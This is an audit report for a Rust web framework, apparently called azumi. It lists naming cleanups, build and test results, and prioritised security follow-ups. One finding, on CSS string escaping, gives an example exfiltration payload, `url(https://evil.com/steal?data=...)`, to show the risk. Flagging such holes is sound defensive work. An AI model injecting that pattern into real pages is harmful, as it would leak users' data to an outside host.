# Full Audit — Every File Checked

## ✅ All Clear

### Underscore Prefix Check
- Routes: `/_azumi/` → `/azumi/` ✅
- JS state keys: `_azumi_` → `azumi_` ✅
- Double-underscore handlers: `__azumi_retry` → `azumi_retry` ✅
- Macro variable: `_azumi_router` → `azumi_router` ✅
- Test comments: `__azumi_retry` → `azumi_retry` ✅
- `data-azumi-scope` → correct (uses `data-` HTML5 prefix) ✅
- `__private` module → correct (Rust convention) ✅
- `render_azumi` trait method → correct (not `_` prefixed) ✅
- `test_azumi_*` test functions → correct (Rust test naming) ✅

### Stale References
- 3KB → all fixed, only CHANGELOG/TODO historical entries remain ✅
- `azumi.dev` domain → removed from GITHUB_SEO.md ✅
- `azumi/devtools` feature flag → `azumi-live-ssr-framework/devtools` in guide.md ✅
- No stale version numbers in production code ✅

### Code Quality
- No `dbg!` traces ✅
- No TODO/FIXME/HACK in production source ✅
- No `full-stack` positioning in user-facing docs ✅
- `allow(dead_code)` — only on `Raw::new()` (used by macros, compiler can't see it) ✅
- `unwrap()` calls — all safe (`unwrap_or_default`, `unwrap_or_else` with fallbacks, or test-only) ✅
- `println!`/`eprintln!` — only in devtools/hot-reload (dev-only) ✅

### Build & Tests
- `cargo build -p azumi-demo` ✅
- 1,782 tests pass, 0 failures ✅

## Fixed This Round
| File | Fix |
|------|-----|
| `.internal/GITHUB_SEO.md` | `azumi.dev` → GitHub URL |
| `docs/guide.md` line 802 | `azumi/devtools` → `azumi-live-ssr-framework/devtools` |
| `src/lib.rs` line 732-739 | `_azumi_router` → `azumi_router` in `routes!` macro |

---

## Review Follow-Ups (from full codebase review)

### P1 — Security: Action handler error messages leak internal state
- **File**: `macros/src/live.rs` (lines ~464, 468)
- **Problem**: Generated handlers return `format!("Security Error: {}", e)` and `format!("State Deserialization Error: {}", e)`, exposing internal error details to clients
- **Fix**: Return generic messages like `"Invalid request"` and `"Internal error"` — log details server-side with `eprintln!` or `tracing`
- **Risk**: Attackers can use error details to probe state structure

### P2 — Correctness: `LiveState::to_scope()` panics on serialization failure
- **File**: `macros/src/live.rs` (line ~564), `src/lib.rs` (lines 133-139)
- **Problem**: `to_scope()` calls `panic!` on serde failure. The `#[azumi::live]` macro generates `to_scope()` (not `try_to_scope()`) in the `LiveState` impl
- **Fix**: Generate `try_to_scope()` usage with `unwrap_or_else` that logs + returns empty string, or change the macro to generate a graceful fallback
- **Risk**: Production panic if a field doesn't implement `Serialize`

### P3 — API safety: `TrustedHtml::new()`, `from_fn`, `from_fn_once` are public but doc-hidden
- **Files**: `src/script.rs` (line 250), `src/lib.rs` (lines 279, 381)
- **Problem**: These are `#[doc(hidden)]` but fully `pub` — user code can call them, bypassing safety guarantees
- **Fix**: Change to `pub(crate)` so only macro-generated code within the crate can access them
- **Caveat**: `TrustedHtml` is documented as the public escape hatch in AGENTS.md — keep it `pub` if it's meant for end users. `from_fn`/`from_fn_once` should be `pub(crate)`.

### P4 — Security: `escape_css_string` doesn't escape `(` and `)`
- **File**: `src/lib.rs` (lines 509-528)
- **Problem**: CSS `url()` can be used for data exfiltration. Unescaped parens in property values could allow `url(https://evil.com/steal?data=...)`
- **Fix**: Add `'(' => result.push_str("\\(")` and `')' => result.push_str("\\)")` to the match
- **Risk**: Low in practice (CSS injection requires prior HTML injection), but defense-in-depth

### P5 — Code quality: Duplicate `escape_html` implementations
- **Files**: `src/lib.rs:478-502` (`Escaped<T>`) and `src/script.rs:26-39` (`escape_html()`)
- **Problem**: Two separate implementations of the same 5-char escape logic. If one changes, the other could diverge
- **Fix**: Make `Escaped<T>` call `escape_html()` internally, or extract a shared `escape_html_inner` function that both use
- **Risk**: Minimal (both are simple character-by-character escapes), but maintenance burden
